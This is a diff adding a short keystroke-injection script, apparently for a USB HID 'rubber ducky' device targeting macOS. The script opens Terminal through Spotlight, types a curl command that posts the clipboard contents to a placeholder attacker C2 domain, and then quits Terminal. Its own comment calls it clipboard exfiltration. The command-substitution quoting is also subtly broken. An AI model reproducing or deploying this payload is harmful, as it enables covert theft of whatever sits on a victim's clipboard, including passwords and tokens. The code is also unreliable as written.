@@ -1,0 +1,11 @@
+REM Exfilterates clipboard data to an attacker-controlled domain
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING curl -s --data '$(pbpaste)' '<C2-domain>'
+ENTER
+ENTER
+GUI q
